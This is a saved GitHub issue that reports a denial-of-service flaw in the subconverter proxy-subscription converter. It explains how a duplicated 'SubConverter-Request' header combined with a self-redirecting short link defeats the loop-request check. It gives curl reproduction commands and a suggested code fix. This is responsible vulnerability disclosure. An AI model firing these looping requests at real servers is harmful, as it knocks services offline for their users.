=== Content from github.com_a36df550_20250119_114143.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftindy2013%2Fsubconverter%2Fissues%2F284)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftindy2013%2Fsubconverter%2Fissues%2F284)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=tindy2013%2Fsubconverter)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tindy2013](/tindy2013)
/
**[subconverter](/tindy2013/subconverter)**
Public

* [Notifications](/login?return_to=%2Ftindy2013%2Fsubconverter) You must be signed in to change notification settings
* [Fork
  2.9k](/login?return_to=%2Ftindy2013%2Fsubconverter)
* [Star
   13.7k](/login?return_to=%2Ftindy2013%2Fsubconverter)

* [Code](/tindy2013/subconverter)
* [Issues
  200](/tindy2013/subconverter/issues)
* [Pull requests
  14](/tindy2013/subconverter/pulls)
* [Actions](/tindy2013/subconverter/actions)
* [Projects
  0](/tindy2013/subconverter/projects)
* [Security](/tindy2013/subconverter/security)
* [Insights](/tindy2013/subconverter/pulse)

Additional navigation options

* [Code](/tindy2013/subconverter)
* [Issues](/tindy2013/subconverter/issues)
* [Pull requests](/tindy2013/subconverter/pulls)
* [Actions](/tindy2013/subconverter/actions)
* [Projects](/tindy2013/subconverter/projects)
* [Security](/tindy2013/subconverter/security)
* [Insights](/tindy2013/subconverter/pulse)

# [vulnerability] Loop Request检测存在问题，可实现拒绝服务攻击 / Loop Request detection is too fragile and can realize denial of service attacks. #284

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[[vulnerability] Loop Request检测存在问题，可实现拒绝服务攻击 / Loop Request detection is too fragile and can realize denial of service attacks.](#top)#284Copy link![@imlk0](https://avatars.githubusercontent.com/u/14936301?u=0edbb69e2cb643ca48b6e27eb176946bae09edde&v=4&size=80)
## Description

![@imlk0](https://avatars.githubusercontent.com/u/14936301?u=0edbb69e2cb643ca48b6e27eb176946bae09edde&v=4&size=48)[imlk0](https://github.com/imlk0)opened [on Dec 19, 2020](https://github.com/tindy2013/subconverter/issues/284#issue-771394706)

[English Version Report](https://gist.github.com/KB5201314/150c3a52aead2741ae5d32930988861b#file-subconverter_vulnerability-md)

## 漏洞危害

通过发送一个请求到服务器，就能实现持续的`Loop request`攻击，导致拒绝服务/服务缓慢

## 漏洞原理

通过精心构造的请求头，绕过`Loop request`防御，配合HTTP重定向（301/302），实现`Loop request`攻击。

该程序存在一个公开访问的[外部API](https://github.com/tindy2013/subconverter#access-interface):

```
http://127.0.0.1:25500/sub?target=%TARGET%&url=%URL%&config=%CONFIG%

```

其中的一个名为`url`参数可以是一个任意的外部url。收到该请求后，服务器会发起一个对该`url`的`GET`请求。

1. 构造`Loop request`

   我们可以构造这样的一个url，我们叫它`BAD_URL_ONE`：

   ```
   http://127.0.0.1:25500/sub?target=clash&insert=false&url=BAD_URL_TWO

   ```

   其中`BAD_URL_TWO`也是一个url，在任何时候它都返回一个`301/302`响应，将请求重定向到`BAD_URL_ONE`（重定向可以用一个简单的nginx做到，或者一个带编辑功能的短链接服务做到）

   向该服务器发送一个GET请求，url是`BAD_URL_ONE`，服务器会请求`BAD_URL_TWO`。由于重定向，服务器会访问`BAD_URL_ONE`（自己访问自己），造成`Loop request`

[![image-20201219221139213](https://user-images.githubusercontent.com/14936301/102692040-caf58300-424b-11eb-8272-97cc577772b5.png)](https://user-images.githubusercontent.com/14936301/102692040-caf58300-424b-11eb-8272-97cc577772b5.png)

不幸的是，这种攻击已经被得到防御，但是我们发现了新的方法来绕过。

2. 绕过服务端`Loop request`防御

   该程序通过检查请求头来实施对`Loop request`攻击的防御：

   在向外部发送请求时，会带上一个自定义的请求头`SubConverter-Request: 1`：

   [subconverter/src/webget.cpp](https://github.com/tindy2013/subconverter/blob/ab4d7543cec46cd9e45680f3b43d82de16f38a3d/src/webget.cpp#L199)

   Line 199
   in
   [ab4d754](/tindy2013/subconverter/commit/ab4d7543cec46cd9e45680f3b43d82de16f38a3d)

   |  | list = curl\_slist\_append(list, "SubConverter-Request: 1"); |
   | --- | --- |

   通过检查请求头中是否包含`SubConverter-Request`，且它的值是否为`"1"`来拒绝`Loop request`：

   [subconverter/src/webserver\_libevent.cpp](https://github.com/tindy2013/subconverter/blob/ab4d7543cec46cd9e45680f3b43d82de16f38a3d/src/webserver_libevent.cpp#L166)

   Line 166
   in
   [ab4d754](/tindy2013/subconverter/commit/ab4d7543cec46cd9e45680f3b43d82de16f38a3d)

   |  | const char \*uri = req->uri, \*internal\_flag = evhttp\_find\_header(req->input\_headers, "SubConverter-Request"); |
   | --- | --- |

   [subconverter/src/webserver\_libevent.cpp](https://github.com/tindy2013/subconverter/blob/ab4d7543cec46cd9e45680f3b43d82de16f38a3d/src/webserver_libevent.cpp#L174)

   Line 174
   in
   [ab4d754](/tindy2013/subconverter/commit/ab4d7543cec46cd9e45680f3b43d82de16f38a3d)

   |  | if(internal\_flag != NULL && strcmp(internal\_flag, "1") == 0) |
   | --- | --- |

[![image-20201219214510521](https://user-images.githubusercontent.com/14936301/102692057-e2347080-424b-11eb-8571-ad84da15952e.png)](https://user-images.githubusercontent.com/14936301/102692057-e2347080-424b-11eb-8571-ad84da15952e.png)

但是该检测方式存在漏洞。

在服务器发出请求`BAD_URL_TWO`时，会顺带将攻击者请求`BAD_URL_ONE`时发送的所有HTTP请求头也带上，像下面这样：

[![image-20201219215030195](https://user-images.githubusercontent.com/14936301/102692091-06904d00-424c-11eb-8c37-d894a5195866.png)](https://user-images.githubusercontent.com/14936301/102692091-06904d00-424c-11eb-8c37-d894a5195866.png)

因此，我们可以用curl请求`BAD_URL_ONE`，并且包含一个叫做`SubConverter-Request`的请求头，但是值不是`"1"`，而是`"2"`，我们就可以得到，两个`SubConverter-Request`💥💥

[![image-20201219215510165](https://user-images.githubusercontent.com/14936301/102692107-16a82c80-424c-11eb-8853-a92fd55f30b9.png)](https://user-images.githubusercontent.com/14936301/102692107-16a82c80-424c-11eb-8853-a92fd55f30b9.png)

程序使用libev的[evhttp\_find\_header](https://libevent.org/doc/http_8h.html#af855b50bd9b47b3f00b44504d38db12c)函数获取请求中的header，这个函数在处理请求中多个相同的header时，只会返回第一个的结果，因此`SubConverter-Request`的值被我们覆盖成了`"2"`，从而绕过了`Loop request`防御。

## 复现过程

1. 从[release页面](https://github.com/tindy2013/subconverter/releases/tag/v0.6.4)下载发布的二进制文件，在本地启动一个服务程序：

   ```
   chmod +x ./subconverter
   ./subconverter
   ```
2. 构造`BAD_URL_ONE`：<http://127.0.0.1:25500/sub?target=clash&insert=false&url=https://t.xice.wang/v>

   其中`BAD_URL_TWO`是一个短链接服务：[https://t.xice.wang/v，它会重定向(301)到`BAD\_URL\_ONE`：](https://t.xice.wang/v%EF%BC%8C%E5%AE%83%E4%BC%9A%E9%87%8D%E5%AE%9A%E5%90%91%28301%29%E5%88%B0%60BAD_URL_ONE%60%EF%BC%9A)

   ```
   curl -v https://t.xice.wang/v

   < HTTP/2 301
   < server: nginx/1.19.0
   < content-type: text/html; charset=UTF-8
   < location: http://127.0.0.1:25500/sub?target=clash&insert=false&url=https://t.xice.wang/v
   < cache-control: no-cache

   ```
3. 发出`BAD_URL_ONE`请求：

   ```
   curl -H 'SubConverter-Request: 2' 'http://127.0.0.1:25500/sub?target=clash&insert=false&url=https://t.xice.wang/v'

   ```

   该请求发出后，程序开始进入无限的`Loop Request`

[![image-20201219223158674](https://user-images.githubusercontent.com/14936301/102692124-29226600-424c-11eb-9926-b4b2a5a69a35.png)](https://user-images.githubusercontent.com/14936301/102692124-29226600-424c-11eb-9926-b4b2a5a69a35.png)

此后新的请求到来时表现为请求缓慢，或者拒绝服务

## 修复建议

去掉`strcmp()`函数，将检测逻辑改成检测`SubConverter-Request`头是否存在

[subconverter/src/webserver\_libevent.cpp](https://github.com/tindy2013/subconverter/blob/ab4d7543cec46cd9e45680f3b43d82de16f38a3d/src/webserver_libevent.cpp#L174)

Line 174
in
[ab4d754](/tindy2013/subconverter/commit/ab4d7543cec46cd9e45680f3b43d82de16f38a3d)

|  | if(internal\_flag != NULL && strcmp(internal\_flag, "1") == 0) |
| --- | --- |

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


